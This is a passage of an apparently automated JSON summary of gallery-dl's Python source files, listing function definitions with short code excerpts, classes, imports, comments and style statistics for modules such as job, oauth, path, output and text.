          "def dispatch(self, msg):\n\"\"\"Call the appropriate message handler\"\"\"\nif msg[0] == Message.Url:\n_, url, kwdict = msg\nif self.metadata_url:\nkwdict[self.metadata_url] = url\nif self.pred_url(url, kwdict):\nself.update_kwdict(kwdict)\nself.handle_url(url, kwdict)\nif FLAGS.FILE is not None:",
          "def handle_url(self, url, kwdict):\n\"\"\"Handle Message.Url\"\"\"\n\ndef handle_directory(self, kwdict):\n\"\"\"Handle Message.Directory\"\"\"",
          "def handle_directory(self, kwdict):\n\"\"\"Handle Message.Directory\"\"\"\n\ndef handle_queue(self, url, kwdict):\n\"\"\"Handle Message.Queue\"\"\"",
          "def handle_queue(self, url, kwdict):\n\"\"\"Handle Message.Queue\"\"\"\n\ndef handle_finalize(self):\n\"\"\"Handle job finalization\"\"\"",
          "def handle_finalize(self):\n\"\"\"Handle job finalization\"\"\"\n\ndef update_kwdict(self, kwdict):\n\"\"\"Update 'kwdict' with additional metadata\"\"\"",
          "def update_kwdict(self, kwdict):\n\"\"\"Update 'kwdict' with additional metadata\"\"\"\nextr = self.extractor\nkwdict[\"category\"] = extr.category\nkwdict[\"subcategory\"] = extr.subcategory\nif self.metadata_http:\nkwdict.pop(self.metadata_http, None)\nif extr.kwdict:\nkwdict.update(extr.kwdict)\nif self.kwdict:",
          "def _init(self):",
          "def _prepare_predicates(self, target, skip=True):",
          "def get_logger(self, name):",
          "def _wrap_logger(self, logger):",
          "def _write_unsupported(self, url):",
          "def __init__(self, url, parent=None):",
          "def handle_url(self, url, kwdict):\n\"\"\"Download the resource specified in 'url'\"\"\"\nhooks = self.hooks\npathfmt = self.pathfmt\narchive = self.archive\n\n# prepare download\npathfmt.set_filename(kwdict)\n\nif \"prepare\" in hooks:",
          "def handle_directory(self, kwdict):\n\"\"\"Set and create the target directory for downloads\"\"\"\nif not self.pathfmt:\nself.initialize(kwdict)\nelse:\nif \"post-after\" in self.hooks:\nfor callback in self.hooks[\"post-after\"]:\ncallback(self.pathfmt)\nif FLAGS.POST is not None:\nFLAGS.process(\"POST\")",
          "def handle_queue(self, url, kwdict):",
          "def handle_finalize(self):",
          "def handle_skip(self):",
          "def download(self, url):\n\"\"\"Download 'url'\"\"\"\nif downloader := self.get_downloader(url[:url.find(\":\")]):\ntry:\nreturn downloader.download(url, self.pathfmt)\nexcept OSError as exc:\nif exc.errno == errno.ENOSPC:\nraise\nself.log.warning(\"%s: %s\", exc.__class__.__name__, exc)\nreturn False",
          "def get_downloader(self, scheme):\n\"\"\"Return a downloader suitable for 'scheme'\"\"\"\ntry:\nreturn self.downloaders[scheme]\nexcept KeyError:\npass\n\ncls = downloader.find(scheme)\nif cls and config.get((\"downloader\", cls.scheme), \"enabled\", True):\ninstance = cls(self)",
          "def initialize(self, kwdict=None):\n\"\"\"Delayed initialization of PathFormat, etc.\"\"\"\nextr = self.extractor\ncfg = extr.config\n\npathfmt = self.pathfmt = path.PathFormat(extr)\nif kwdict:\npathfmt.set_directory(kwdict)\n\nself.sleep = util.build_duration_func(cfg(\"sleep\"))",
          "def register_hooks(self, hooks, options=None):",
          "def _call_hook(self, callback, condition, pathfmt):",
          "def _build_extractor_filter(self):",
          "def handle_url(self, url, kwdict):",
          "def handle_directory(self, kwdict):",
          "def __init__(self, url, parent=None):",
          "def handle_url(self, url, kwdict):",
          "def handle_directory(self, kwdict):",
          "def handle_queue(self, url, kwdict):",
          "def print_kwdict(self, kwdict, prefix=\"\", markers=None):\n\"\"\"Print key-value pairs in 'kwdict' with formatting\"\"\"\nwrite = sys.stdout.write\nsuffix = \"']\" if prefix else \"\"\n\nmarkerid = id(kwdict)\nif markers is None:\nmarkers = {markerid}\nelif markerid in markers:\nwrite(f\"{prefix[:-2]}\\n  <circular reference>\\n\")",
          "def __init__(self, url, parent=None, depth=1):",
          "def handle_url(self, url, _):",
          "def handle_url_fallback(self, url, kwdict):",
          "def handle_queue(self, url, kwdict):",
          "def run(self):",
          "def _print_multi(self, title, *values):",
          "def _print_config(self, title, optname, value):",
          "def __init__(self, url, parent=None, file=sys.stdout, ensure_ascii=True,",
          "def run(self):",
          "def handle_url(self, url, kwdict):",
          "def handle_directory(self, kwdict):",
          "def handle_queue(self, url, kwdict):",
          "def handle_queue_resolve(self, url, kwdict):"
        ],
        "class_defs": [
          "class Job():",
          "class DownloadJob(Job):",
          "class SimulationJob(DownloadJob):",
          "class KeywordJob(Job):",
          "class UrlJob(Job):",
          "class InfoJob(Job):",
          "class DataJob(Job):"
        ],
        "imports": [
          "import sys",
          "import errno",
          "import logging",
          "import functools",
          "import collections",
          "from . import (",
          "from .extractor.message import Message",
          "from .actions import LoggerAdapter, parse_logging"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# Copyright 2015-2025 Mike F\u00e4hrmann",
          "#",
          "# This program is free software; you can redistribute it and/or modify",
          "# it under the terms of the GNU General Public License version 2 as",
          "# published by the Free Software Foundation.",
          "# user-supplied metadata",
          "# sleep before extractor start",
          "# prepare download",
          "# download from URL",
          "# use fallback URLs if available/enabled",
          "# download failed",
          "# run post processors",
          "# download succeeded",
          "# monkey-patch method to do nothing and always return True",
          "# monkey-patch methods to always return False",
          "# string or number",
          "# collect data",
          "# convert numbers to string",
          "# dump to 'file'"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 34,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/gallery-dl/gallery_dl/oauth.py",
        "docstrings": [],
        "function_defs": [
          "def nonce(size, alphabet=string.ascii_letters):\n\"\"\"Generate a nonce value with 'size' characters\"\"\"\nreturn \"\".join(random.choice(alphabet) for _ in range(size))\n\n\ndef quote(value, quote=urllib.parse.quote):\n\"\"\"Quote 'value' according to the OAuth1.0 standard\"\"\"",
          "def quote(value, quote=urllib.parse.quote):\n\"\"\"Quote 'value' according to the OAuth1.0 standard\"\"\"\nreturn quote(value, \"~\")\n\n\ndef concat(*args):\n\"\"\"Concatenate 'args' as expected by OAuth1.0\"\"\"",
          "def concat(*args):\n\"\"\"Concatenate 'args' as expected by OAuth1.0\"\"\"\nreturn \"&\".join(quote(item) for item in args)\n\n\nclass OAuth1Session(requests.Session):\n\"\"\"Extension to requests.Session to support OAuth 1.0\"\"\"",
          "def __init__(self, consumer_key, consumer_secret,",
          "def rebuild_auth(self, prepared_request, response):",
          "def __init__(self, consumer_key, consumer_secret,",
          "def __call__(self, request):",
          "def generate_signature(self, request, params):\n\"\"\"Generate 'oauth_signature' value\"\"\"\nurl, _, query = request.url.partition(\"?\")\n\nparams = params.copy()\nfor key, value in text.parse_query(query).items():\nparams.append((quote(key), quote(value)))\nparams.sort()\nquery = \"&\".join(\"=\".join(item) for item in params)\n",
          "def __init__(self, extractor):",
          "def request(self, url, **kwargs):",
          "def _token_cache(key):"
        ],
        "class_defs": [
          "class OAuth1Session(requests.Session):",
          "class OAuth1Client(requests.auth.AuthBase):",
          "class OAuth1API():"
        ],
        "imports": [
          "import hmac",
          "import time",
          "import random",
          "import string",
          "import hashlib",
          "import binascii",
          "import urllib.parse",
          "import requests",
          "import requests.auth",
          "from . import text",
          "from .cache import cache"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# Copyright 2018-2020 Mike F\u00e4hrmann",
          "#",
          "# This program is free software; you can redistribute it and/or modify",
          "# it under the terms of the GNU General Public License version 2 as",
          "# published by the Free Software Foundation."
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": [
          "@cache(maxage=36500*86400, keyarg=0)"
        ]
      },
      {
        "file": "/Volumes/# 2/Stash/external/gallery-dl/gallery_dl/option.py",
        "docstrings": [],
        "function_defs": [
          "def __call__(self, parser, namespace, values, option_string=None):",
          "def __call__(self, parser, namespace, values, option_string=None):",
          "def __call__(self, parser, namespace, values, option_string=None):",
          "def __call__(self, parser, namespace, values, option_string=None):",
          "def __call__(self, parser, namespace, values, option_string=None):",
          "def __call__(self, parser, namespace, values, option_string=None):",
          "def __call__(self, parser, namespace, value, option_string=None):",
          "def __call__(self, parser, namespace, value, option_string=None):",
          "def __call__(self, parser, namespace, value, option_string=None):",
          "def __call__(self, parser, namespace, value, option_string=None):",
          "def __call__(self, parser, namespace, value, option_string=None):",
          "def __init__(self, prog):",
          "def _format_action_invocation(self, action):",
          "def _format_usage(self, usage, actions, groups, prefix):",
          "def _parse_option(opt):",
          "def build_parser():\n\"\"\"Build and configure an ArgumentParser object\"\"\"\nparser = argparse.ArgumentParser(\nformatter_class=Formatter,\nadd_help=False,\n)\n\ngeneral = parser.add_argument_group(\"General Options\")\ngeneral.add_argument(\n\"-h\", \"--help\","
        ],
        "class_defs": [
          "class ConfigAction(argparse.Action):",
          "class ConfigConstAction(argparse.Action):",
          "class AppendCommandAction(argparse.Action):",
          "class DeprecatedConfigConstAction(argparse.Action):",
          "class ConfigParseAction(argparse.Action):",
          "class PPParseAction(argparse.Action):",
          "class InputfileAction(argparse.Action):",
          "class MtimeAction(argparse.Action):",
          "class RenameAction(argparse.Action):",
          "class UgoiraAction(argparse.Action):",
          "class PrintAction(argparse.Action):",
          "class Formatter(argparse.HelpFormatter):"
        ],
        "imports": [
          "import argparse",
          "import logging",
          "import os.path",
          "import sys",
          "from . import job, util, version"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# Copyright 2017-2025 Mike F\u00e4hrmann",
          "#",
          "# This program is free software; you can redistribute it and/or modify",
          "# it under the terms of the GNU General Public License version 2 as",
          "# published by the Free Software Foundation.",
          "# restore normal behavior when adding '-4' or '-6' as arguments"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 1,
        "error_handling": 4,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/gallery-dl/gallery_dl/output.py",
        "docstrings": [],
        "function_defs": [
          "def makeRecord(self, name, level, fn, lno, msg, args, exc_info,",
          "def __init__(self, logger, job):",
          "def debug(self, msg, *args, **kwargs):",
          "def info(self, msg, *args, **kwargs):",
          "def warning(self, msg, *args, **kwargs):",
          "def error(self, msg, *args, **kwargs):",
          "def __init__(self, job):",
          "def __getattribute__(self, name):",
          "def __str__(self):",
          "def __init__(self, job):",
          "def __getattribute__(self, name):",
          "def __init__(self, fmt, datefmt):",
          "def format(self, record):",
          "def initialize_logging(loglevel):\n\"\"\"Setup basic logging functionality before configfiles have been loaded\"\"\"\n# convert levelnames to lowercase\nfor level in (10, 20, 30, 40, 50):\nname = logging.getLevelName(level)\nlogging.addLevelName(level, name.lower())\n\n# register custom Logging class\nlogging.Logger.manager.setLoggerClass(Logger)\n",
          "def configure_logging(loglevel):",
          "def setup_logging_handler(key, fmt=LOG_FORMAT, lvl=LOG_LEVEL, mode=\"w\"):\n\"\"\"Setup a new logging handler\"\"\"\nopts = config.interpolate((\"output\",), key)\nif not opts:\nreturn None\nif not isinstance(opts, dict):\nopts = {\"path\": opts}\n\npath = opts.get(\"path\")\nmode = opts.get(\"mode\", mode)",
          "def stdout_write_flush(s):",
          "def stderr_write_flush(s):",
          "def stdout_write(s):",
          "def stderr_write(s):",
          "def configure_standard_streams():",
          "def select():\n\"\"\"Select a suitable output class\"\"\"\nmode = config.get((\"output\",), \"mode\")\n\nif mode is None or mode == \"auto\":\ntry:\nif TTY_STDOUT:\noutput = ColorOutput() if ANSI else TerminalOutput()\nelse:\noutput = PipeOutput()",
          "def start(self, path):\n\"\"\"Print a message indicating the start of a download\"\"\"\n\ndef skip(self, path):\n\"\"\"Print a message indicating that a download has been skipped\"\"\"",
          "def skip(self, path):\n\"\"\"Print a message indicating that a download has been skipped\"\"\"\n\ndef success(self, path):\n\"\"\"Print a message indicating the completion of a download\"\"\"",
          "def success(self, path):\n\"\"\"Print a message indicating the completion of a download\"\"\"\n\ndef progress(self, bytes_total, bytes_downloaded, bytes_per_second):\n\"\"\"Display download progress\"\"\"",
          "def progress(self, bytes_total, bytes_downloaded, bytes_per_second):\n\"\"\"Display download progress\"\"\"\n\n\nclass PipeOutput(NullOutput):\n\ndef skip(self, path):\nstdout_write(f\"{CHAR_SKIP}{path}\\n\")\n\ndef success(self, path):",
          "def skip(self, path):",
          "def success(self, path):",
          "def __init__(self):",
          "def start(self, path):",
          "def skip(self, path):",
          "def success(self, path):",
          "def progress(self, bytes_total, bytes_downloaded, bytes_per_second):",
          "def __init__(self):",
          "def start(self, path):",
          "def skip(self, path):",
          "def success(self, path):",
          "def __init__(self, options):",
          "def _make_func(self, shorten, format_string, limit):",
          "def start(self, path):",
          "def skip(self, path):",
          "def success(self, path):",
          "def progress(self, bytes_total, bytes_downloaded, bytes_per_second):",
          "def __missing__(self, key):",
          "def shorten_string(txt, limit, sep=\"\u2026\"):\n\"\"\"Limit width of 'txt'; assume all characters have a width of 1\"\"\"\nif len(txt) <= limit:\nreturn txt\nlimit -= len(sep)\nreturn f\"{txt[:limit // 2]}{sep}{txt[-((limit+1) // 2):]}\"\n\n\ndef shorten_string_eaw(txt, limit, sep=\"\u2026\", cache=EAWCache()):\n\"\"\"Limit width of 'txt'; check for east-asian characters with width > 1\"\"\"",
          "def shorten_string_eaw(txt, limit, sep=\"\u2026\", cache=EAWCache()):\n\"\"\"Limit width of 'txt'; check for east-asian characters with width > 1\"\"\"\nchar_widths = [cache[c] for c in txt]\ntext_width = sum(char_widths)\n\nif text_width <= limit:\n# no shortening required\nreturn txt\n\nlimit -= len(sep)"
        ],
        "class_defs": [
          "class Logger(logging.Logger):",
          "class LoggerAdapter():",
          "class PathfmtProxy():",
          "class KwdictProxy():",
          "class Formatter(logging.Formatter):",
          "class NullOutput():",
          "class PipeOutput(NullOutput):",
          "class TerminalOutput():",
          "class ColorOutput(TerminalOutput):",
          "class CustomOutput():",
          "class EAWCache(dict):"
        ],
        "imports": [
          "import os",
          "import sys",
          "import shutil",
          "import logging",
          "import unicodedata",
          "from . import config, util, formatter"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# Copyright 2015-2025 Mike F\u00e4hrmann",
          "#",
          "# This program is free software; you can redistribute it and/or modify",
          "# it under the terms of the GNU General Public License version 2 as",
          "# published by the Free Software Foundation.",
          "# --------------------------------------------------------------------",
          "# Globals",
          "# --------------------------------------------------------------------",
          "# Logging",
          "# convert levelnames to lowercase",
          "# register custom Logging class",
          "# setup basic logging to stderr",
          "# stream logging handler",
          "# file logging handler",
          "# --------------------------------------------------------------------",
          "# Utility functions",
          "# --------------------------------------------------------------------",
          "# Downloader output",
          "# no shortening required",
          "# all characters have a width of 1",
          "# wide characters"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 1,
        "error_handling": 12,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/gallery-dl/gallery_dl/path.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, extractor):",
          "def __str__(self):",
          "def open(self, mode=\"wb\"):\n\"\"\"Open file and return a corresponding file object\"\"\"\ntry:\nreturn open(self.temppath, mode)\nexcept FileNotFoundError:\nif \"r\" in mode:\n# '.part' file no longer exists\nreturn util.NullContext()\nos.makedirs(self.realdirectory)\nreturn open(self.temppath, mode)",
          "def exists(self):\n\"\"\"Return True if the file exists on disk\"\"\"\nif self.extension and os.path.exists(self.realpath):\nreturn self.check_file()\nreturn False\n\ndef check_file(self):\nreturn True\n\ndef _enum_file(self):",
          "def check_file(self):",
          "def _enum_file(self):",
          "def set_directory(self, kwdict):\n\"\"\"Build directory path and create it if necessary\"\"\"\nself.kwdict = kwdict\n\nif segments := self.build_directory(kwdict):\nself.directory = directory = self.basedirectory + self.clean_path(\nos.sep.join(segments) + os.sep)\nelse:\nself.directory = directory = self.basedirectory\n",
          "def _extended_path(self, path):",
          "def set_filename(self, kwdict):\n\"\"\"Set general filename data\"\"\"\nself.kwdict = kwdict\nself.filename = self.temppath = self.prefix = \"\"\n\next = kwdict[\"extension\"]\nkwdict[\"extension\"] = self.extension = self.extension_map(ext, ext)\n\ndef set_extension(self, extension, real=True):\n\"\"\"Set filename extension\"\"\"",
          "def set_extension(self, extension, real=True):\n\"\"\"Set filename extension\"\"\"\nself.extension = extension = self.extension_map(extension, extension)\nself.kwdict[\"extension\"] = self.prefix + extension\n\ndef fix_extension(self, _=None):\n\"\"\"Fix filenames without a given filename extension\"\"\"",
          "def fix_extension(self, _=None):\n\"\"\"Fix filenames without a given filename extension\"\"\"\ntry:\nif not self.extension:\nself.kwdict[\"extension\"] = \\\nself.prefix + self.extension_map(\"\", \"\")\nself.build_path()\nif self.path[-1] == \".\":\nself.path = self.path[:-1]\nself.temppath = self.realpath = self.realpath[:-1]",
          "def build_filename(self, kwdict):\n\"\"\"Apply 'kwdict' to filename format string\"\"\"\ntry:\nreturn self.clean_path(self.clean_segment(\nself.filename_formatter(kwdict)))\nexcept Exception as exc:\nraise exception.FilenameFormatError(exc)\n\ndef build_filename_conditional(self, kwdict):\ntry:",
          "def build_filename_conditional(self, kwdict):",
          "def build_directory(self, kwdict):\n\"\"\"Apply 'kwdict' to directory format strings\"\"\"\nsegments = []\nstrip = self.strip\n\ntry:\nfor fmt in self.directory_formatters:\nsegment = fmt(kwdict).strip()\nif strip and segment not in {\".\", \"..\"}:\n# remove trailing dots and spaces (#647)",
          "def build_directory_conditional(self, kwdict):",
          "def build_path(self):\n\"\"\"Combine directory and filename to full paths\"\"\"\nself.filename = filename = self.build_filename(self.kwdict)\nself.path = self.directory + filename\nself.realpath = self.realdirectory + filename\nif not self.temppath:\nself.temppath = self.realpath\n\ndef part_enable(self, part_directory=None):\n\"\"\"Enable .part file usage\"\"\"",
          "def part_enable(self, part_directory=None):\n\"\"\"Enable .part file usage\"\"\"\nif self.extension:\nself.temppath += \".part\"\nelse:\nself.kwdict[\"extension\"] = self.prefix + self.extension_map(\n\"part\", \"part\")\nself.build_path()\nif part_directory:\nself.temppath = os.path.join(",
          "def part_size(self):\n\"\"\"Return size of .part file\"\"\"\ntry:\nreturn os.stat(self.temppath).st_size\nexcept OSError:\npass\nreturn 0\n\ndef set_mtime(self, path=None):\nif (mtime := (self.kwdict.get(\"_mtime_meta\") or",
          "def set_mtime(self, path=None):",
          "def finalize(self):\n\"\"\"Move tempfile to its target location\"\"\"\nif self.delete:\nself.delete = False\nos.unlink(self.temppath)\nreturn\n\nif self.temppath != self.realpath:\n# Move temp file to its actual location\nwhile True:",
          "def _build_convertfunc(func, conv):",
          "def convert_many(x):",
          "def _build_cleanfunc(chars, repl, conv=None):",
          "def func(x):",
          "def func(x):",
          "def _process_repl_dict(chars):"
        ],
        "class_defs": [
          "class PathFormat():"
        ],
        "imports": [
          "import os",
          "import shutil",
          "import functools",
          "from . import util, formatter, exception"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# Copyright 2021-2025 Mike F\u00e4hrmann",
          "#",
          "# This program is free software; you can redistribute it and/or modify",
          "# it under the terms of the GNU General Public License version 2 as",
          "# published by the Free Software Foundation.",
          "# '.part' file no longer exists",
          "# Enable longer-than-260-character paths",
          "# abspath() in Python 3.7+ removes trailing path separators (#402)",
          "# remove trailing dots and spaces (#647)",
          "# Move temp file to its actual location",
          "# delayed directory creation",
          "# file at self.temppath does not exist",
          "# move across different filesystems",
          "# can't modify 'chars' while *directly* iterating over its keys"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 2,
        "error_handling": 36,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/gallery-dl/gallery_dl/text.py",
        "docstrings": [],
        "function_defs": [
          "def re(pattern):\n\"\"\"Compile a regular expression pattern\"\"\"\ntry:\nreturn PATTERN_CACHE[pattern]\nexcept KeyError:\np = PATTERN_CACHE[pattern] = re_compile(pattern)\nreturn p\n\n\ndef remove_html(txt, repl=\" \", sep=\" \"):",
          "def remove_html(txt, repl=\" \", sep=\" \"):\n\"\"\"Remove html-tags from a string\"\"\"\ntry:\ntxt = HTML_RE.sub(repl, txt)\nexcept TypeError:\nreturn \"\"\nif sep:\nreturn sep.join(txt.split())\nreturn txt.strip()\n",
          "def split_html(txt):\n\"\"\"Split input string by HTML tags\"\"\"\ntry:\nreturn [\nunescape(x).strip()\nfor x in HTML_RE.split(txt)\nif x and not x.isspace()\n]\nexcept TypeError:\nreturn []",
          "def slugify(value):\n\"\"\"Convert a string to a URL slug\n\nAdapted from:\nhttps://github.com/django/django/blob/master/django/utils/text.py\n\"\"\"",
          "def sanitize_whitespace(value):\n\"\"\"Replace all whitespace characters with a single space\"\"\"\nreturn re(r\"\\s+\").sub(\" \", value.strip())\n\n\ndef ensure_http_scheme(url, scheme=\"https://\"):\n\"\"\"Prepend 'scheme' to 'url' if it doesn't have one\"\"\"",
          "def ensure_http_scheme(url, scheme=\"https://\"):\n\"\"\"Prepend 'scheme' to 'url' if it doesn't have one\"\"\"\nif url and not url.startswith((\"https://\", \"http://\")):\nreturn scheme + url.lstrip(\"/:\")\nreturn url\n\n\ndef root_from_url(url, scheme=\"https://\"):\n\"\"\"Extract scheme and domain from a URL\"\"\"",
          "def root_from_url(url, scheme=\"https://\"):\n\"\"\"Extract scheme and domain from a URL\"\"\"\nif not url.startswith((\"https://\", \"http://\")):\ntry:\nreturn scheme + url[:url.index(\"/\")]\nexcept ValueError:\nreturn scheme + url\ntry:\nreturn url[:url.index(\"/\", 8)]\nexcept ValueError:",
          "def filename_from_url(url):\n\"\"\"Extract the last part of an URL to use as a filename\"\"\"\ntry:\nreturn url.partition(\"?\")[0].rpartition(\"/\")[2]\nexcept Exception:\nreturn \"\"\n\n\ndef ext_from_url(url):\n\"\"\"Extract the filename extension of an URL\"\"\"",
          "def ext_from_url(url):\n\"\"\"Extract the filename extension of an URL\"\"\"\nname, _, ext = filename_from_url(url).rpartition(\".\")\nreturn ext.lower() if name else \"\"\n\n\ndef nameext_from_url(url, data=None):\n\"\"\"Extract the last part of an URL and fill 'data' accordingly\"\"\"",
          "def nameext_from_url(url, data=None):\n\"\"\"Extract the last part of an URL and fill 'data' accordingly\"\"\"\nif data is None:\ndata = {}\n\nfilename = unquote(filename_from_url(url))\nname, _, ext = filename.rpartition(\".\")\nif name and len(ext) <= 16:\ndata[\"filename\"], data[\"extension\"] = name, ext.lower()\nelse:",
          "def extract(txt, begin, end, pos=None):\n\"\"\"Extract the text between 'begin' and 'end' from 'txt'\n\nArgs:\ntxt: String to search in\nbegin: First string to be searched for\nend: Second string to be searched for after 'begin'\npos: Starting position for searches in 'txt'\n\nReturns:",
          "def extr(txt, begin, end, default=\"\"):\n\"\"\"Stripped-down version of 'extract()'\"\"\"\ntry:\nfirst = txt.index(begin) + len(begin)\nreturn txt[first:txt.index(end, first)]\nexcept Exception:\nreturn default\n\n\ndef rextract(txt, begin, end, pos=None):",
          "def rextract(txt, begin, end, pos=None):",
          "def rextr(txt, begin, end, pos=None, default=\"\"):\n\"\"\"Stripped-down version of 'rextract()'\"\"\"\ntry:\nfirst = txt.rindex(begin, None, pos) + len(begin)\nreturn txt[first:txt.index(end, first)]\nexcept Exception:\nreturn default\n\n\ndef extract_all(txt, rules, pos=None, values=None):",
          "def extract_all(txt, rules, pos=None, values=None):\n\"\"\"Calls extract for each rule and returns the result in a dict\"\"\"\nif values is None:\nvalues = {}\nfor key, begin, end in rules:\nresult, pos = extract(txt, begin, end, pos)\nif key:\nvalues[key] = result\nreturn values, 0 if pos is None else pos\n",
          "def extract_iter(txt, begin, end, pos=None):\n\"\"\"Yield values that would be returned by repeated calls of extract()\"\"\"\ntry:\nindex = txt.index\nlbeg = len(begin)\nlend = len(end)\nwhile True:\nfirst = index(begin, pos) + lbeg\nlast = index(end, first)\npos = last + lend",
          "def extract_from(txt, pos=None, default=\"\"):\n\"\"\"Returns a function object that extracts from 'txt'\"\"\"\ndef extr(begin, end, index=txt.index, txt=txt):\nnonlocal pos\ntry:\nfirst = index(begin, pos) + len(begin)\nlast = index(end, first)\npos = last + len(end)\nreturn txt[first:last]\nexcept Exception:",
          "def extr(begin, end, index=txt.index, txt=txt):",
          "def parse_unicode_escapes(txt):\n\"\"\"Convert JSON Unicode escapes in 'txt' into actual characters\"\"\"\nif \"\\\\u\" in txt:\nreturn re(r\"\\\\u([0-9a-fA-F]{4})\").sub(_hex_to_char, txt)\nreturn txt\n\n\ndef _hex_to_char(match):\nreturn chr(int(match[1], 16))\n",
          "def _hex_to_char(match):",
          "def parse_bytes(value, default=0, suffixes=\"bkmgtp\"):\n\"\"\"Convert a bytes-amount (\"500k\", \"2.5M\", ...) to int\"\"\"\nif not value:\nreturn default\n\nvalue = str(value).strip()\nlast = value[-1].lower()\n\nif last in suffixes:\nmul = 1024 ** suffixes.index(last)",
          "def parse_int(value, default=0):\n\"\"\"Convert 'value' to int\"\"\"\nif not value:\nreturn default\ntry:\nreturn int(value)\nexcept Exception:\nreturn default\n\n",
          "def parse_float(value, default=0.0):\n\"\"\"Convert 'value' to float\"\"\"\nif not value:\nreturn default\ntry:\nreturn float(value)\nexcept Exception:\nreturn default\n\n",
          "def parse_query(qs):\n\"\"\"Parse a query string into name-value pairs\n\nIgnore values whose name has been seen before\n\"\"\"",
          "def parse_query_list(qs, as_list=()):\n\"\"\"Parse a query string into name-value pairs\n\nCombine values of names in 'as_list' into lists\n\"\"\"",
          "def build_query(params):",
          "def parse_timestamp(ts, default=None):\n\"\"\"Create a datetime object from a Unix timestamp\"\"\"\ntry:\nreturn datetime.datetime.utcfromtimestamp(int(ts))\nexcept Exception:\nreturn default\nelse:\n# Python >= 3.12\ndef parse_timestamp(ts, default=None):\n\"\"\"Create a datetime object from a Unix timestamp\"\"\"",
          "def parse_timestamp(ts, default=None):\n\"\"\"Create a datetime object from a Unix timestamp\"\"\"\ntry:\nY, m, d, H, M, S, _, _, _ = time.gmtime(int(ts))\nreturn datetime.datetime(Y, m, d, H, M, S)\nexcept Exception:\nreturn default\n\n\ndef parse_datetime(date_string, format=\"%Y-%m-%dT%H:%M:%S%z\", utcoffset=0):",
          "def parse_datetime(date_string, format=\"%Y-%m-%dT%H:%M:%S%z\", utcoffset=0):\n\"\"\"Create a datetime object by parsing 'date_string'\"\"\"\ntry:\nd = datetime.datetime.strptime(date_string, format)\no = d.utcoffset()\nif o is not None:\n# convert to naive UTC\nd = d.replace(tzinfo=None, microsecond=0) - o\nelse:\nif d.microsecond:"
        ],
        "class_defs": [],
        "imports": [
          "import sys",
          "import html",
          "import time",
          "import datetime",
          "import urllib.parse",
          "import re as re_module"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# Copyright 2015-2025 Mike F\u00e4hrmann",
          "#",
          "# This program is free software; you can redistribute it and/or modify",
          "# it under the terms of the GNU General Public License version 2 as",
          "# published by the Free Software Foundation.",
          "# Python <= 3.11",
          "# Python >= 3.12",
          "# convert to naive UTC",
          "# apply manual UTC offset"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 43,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/gallery-dl/gallery_dl/transaction_id.py",
        "docstrings": [],
        "function_defs": [
          "def __getstate__(self):",
          "def __setstate__(self, state):",
          "def initialize(self, extractor, homepage=None):",
          "def _extract_verification_key(self, homepage):",
          "def _extract_indices(self, ondemand_s, extractor):",
          "def _extract_frames(self, homepage):",
          "def _calculate_animation_key(self, frames, row_index, key_bytes,",
          "def _generate_2d_array(self, frame):",
          "def animate(self, frames, target_time):",
          "def generate_transaction_id(self, method, path,",
          "def cubic_value(curve, t):",
          "def cubic_calculate(a, b, m):",
          "def interpolate_list(x, a, b):",
          "def interpolate_value(x, a, b):",
          "def rotation_matrix_2d(deg):",
          "def float_to_hex(numf):",
          "def is_odd(num):",
          "def round_js(num):",
          "def scale(value, value_min, value_max, rounding):"
        ],
        "class_defs": [
          "class ClientTransaction():"
        ],
        "imports": [
          "import math",
          "import time",
          "import random",
          "import hashlib",
          "import binascii",
          "import itertools",
          "from . import text, util",
          "from .cache import cache"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# Copyright 2025 Mike F\u00e4hrmann",
          "#",
          "# This program is free software; you can redistribute it and/or modify",
          "# it under the terms of the GNU General Public License version 2 as",
          "# published by the Free Software Foundation.",
          "# Adapted from iSarabjitDhiman/XClientTransaction",
          "# https://github.com/iSarabjitDhiman/XClientTransaction",
          "# References:",
          "# https://antibot.blog/posts/1741552025433",
          "# https://antibot.blog/posts/1741552092462",
          "# https://antibot.blog/posts/1741552163416",
          "# Cubic Curve",
          "# Interpolation",
          "# Rotation",
          "# Utilities"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 2,
        "error_handling": 0,
        "decorators": [
          "@cache(maxage=36500*86400, keyarg=1)"
        ]
      },
      {
        "file": "/Volumes/# 2/Stash/external/gallery-dl/gallery_dl/update.py",
        "docstrings": [],
        "function_defs": [
          "def handle_url(self, url, kwdict):",
          "def _check_update(self, kwdict):",
          "def _warning(self, msg, *args):",
          "def _error(self, msg, *args):",
          "def items(self):"
        ],
        "class_defs": [
          "class UpdateJob(DownloadJob):",
          "class UpdateExtractor(Extractor):"
        ],
        "imports": [
          "import os",
          "import sys",
          "from .extractor.common import Extractor, Message",
          "from .job import DownloadJob",
          "from . import util, version, output, exception",
          "import atexit",
          "import subprocess"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# Copyright 2024-2025 Mike F\u00e4hrmann",
          "#",
          "# This program is free software; you can redistribute it and/or modify",
          "# it under the terms of the GNU General Public License version 2 as",
          "# published by the Free Software Foundation."
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 2,
        "error_handling": 13,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/gallery-dl/gallery_dl/util.py",
        "docstrings": [],
        "function_defs": [
